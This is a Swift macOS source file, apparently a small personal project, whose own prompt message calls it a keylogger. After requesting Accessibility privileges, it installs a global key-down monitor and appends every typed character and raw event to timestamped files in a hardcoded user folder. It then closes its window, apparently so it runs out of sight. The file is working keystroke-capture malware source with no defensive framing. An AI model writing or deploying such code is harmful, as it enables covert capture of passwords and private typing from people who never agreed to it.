//
//  AppDelegate.swift
//  test
//
//  Created by IOANNIS DELIGIANNIS on 1/2/16.
//  Copyright © 2016 IOANNIS DELIGIANNIS. All rights reserved.
//

import Cocoa

extension String {
    func appendLineToURL(fileURL: NSURL) throws {
        try self.stringByAppendingString("\n\n").appendToURL(fileURL)
    }
    
    func appendToURL(fileURL: NSURL) throws {
        let data = self.dataUsingEncoding(NSUTF8StringEncoding)!
        try data.appendToURL(fileURL)
    }
}

extension NSData {
    func appendToURL(fileURL: NSURL) throws {
        if let fileHandle = try? NSFileHandle(forWritingToURL: fileURL) {
            defer {
                fileHandle.closeFile()
            }
            fileHandle.seekToEndOfFile()
            fileHandle.writeData(self)
        }
        else {
            try writeToURL(fileURL, options: .DataWritingAtomic)
        }
    }
}


let date_timestamp = String(NSDate().timeIntervalSince1970)
let filename1 = "/Users/johndel/projects/swift/test/keys" + date_timestamp + ".txt"
let filename2 = "/Users/johndel/projects/swift/test/events" + date_timestamp + ".txt"

func acquirePrivileges() -> Bool {
    let accessEnabled = AXIsProcessTrustedWithOptions(
        [kAXTrustedCheckOptionPrompt.takeUnretainedValue() as String: true])
    
    if accessEnabled != true {
        print("You need to enable the keylogger in the System Prefrences")
    }
    return accessEnabled == true;
}


@NSApplicationMain
class AppDelegate: NSObject, NSApplicationDelegate {
    func applicationDidFinishLaunching(aNotification: NSNotification) {
        // Insert code here to initialize your application
        acquirePrivileges();
        
        // keyboard listeners
        NSEvent.addGlobalMonitorForEventsMatchingMask(
            NSEventMask.KeyDownMask, handler: {(event: NSEvent) in
                print(String(event.characters!))
                do {
                    let url = NSURL(fileURLWithPath: filename1)
                    try String(event.characters!).appendToURL(url)
                }
                catch {
                    print("Could not write to file")
                }
                
                do {
                    let url = NSURL(fileURLWithPath: filename2)
                    try String(event).appendLineToURL(url)
                }
                catch {
                    print("Could not write to file")
                }
        })
        NSApplication.sharedApplication().windows.last!.close()

    }

    func applicationWillTerminate(aNotification: NSNotification) {
        // Insert code here to tear down your application
    }
}



